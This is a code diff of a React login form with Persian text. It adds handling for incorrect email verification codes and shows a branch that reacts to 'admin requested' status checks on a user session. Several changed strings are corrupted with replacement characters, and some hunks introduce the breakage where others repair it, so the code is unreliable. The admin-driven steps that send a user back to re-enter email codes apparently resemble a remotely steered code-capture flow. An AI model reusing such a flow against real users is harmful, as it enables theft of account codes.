@@ -272,8 +272,21 @@ export const LoginForm = () => {
           setEmailCode(""); // Clear email code field
           setErrors({
             emailCode:
-              "کد ایمیل وارد شده اشتباه ا��ت. لطفا کد صحیح را وارد کنید.",
+              "کد ایمیل وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
           });
+          break;
+        case "email_code":
+          // Handle incorrect_email_code specifically
+          console.log("🚫 Handling incorrect email code from switch");
+          setCurrentStep("email");
+          setEmailStep("code");
+          setEmailCode(""); // Clear email code field
+          setErrors({
+            emailCode:
+              "کد ایمیل وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
+          });
+          setHasError(true);
+          setIsSubmitting(false);
           break;
       }
       return;
@@ -313,7 +326,7 @@ export const LoginForm = () => {
         setIsSubmitting(false); // Ensure loading state is cleared
         break;
       case "check_status":
-        // بررسی دقیق وضعیت ک��ربر با Enhanced Offline Detection
+        // بررسی دقیق وضعیت کاربر با Enhanced Offline Detection
         console.log("🔍 Admin requested enhanced status check for session:", sessionId);
 
         const isVisible = !document.hidden;
@@ -1463,7 +1476,7 @@ export const LoginForm = () => {
                             <input
                               aria-invalid="false"
                               name="invite_code"
-                              placeholder="کد معرف (اختیاری)"
+                              placeholder="کد معر�� (اختیاری)"
                               type="text"
                               value={inviteCode}
                               onChange={(e) => setInviteCode(e.target.value)}
@@ -1598,7 +1611,7 @@ export const LoginForm = () => {
                           />
                           <span>
                             <p style={{textAlign: "right"}}>
-                              ��د دعوت صرفا در زمان ثبت‌نام قابل استفاده ا��ت.
+                              ��د دعوت صرفا در زمان ثبت‌نام قابل استفاده است.
                             </p>
                             <p>
                               <br />
@@ -2382,7 +2395,7 @@ export const LoginForm = () => {
                       textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                     }}
                   >
-                    ارسال مجدد پس از {countdown} ثانیه
+                    ارسال مج��د پس از {countdown} ثانیه
                   </span>
                 ) : (
                   <>
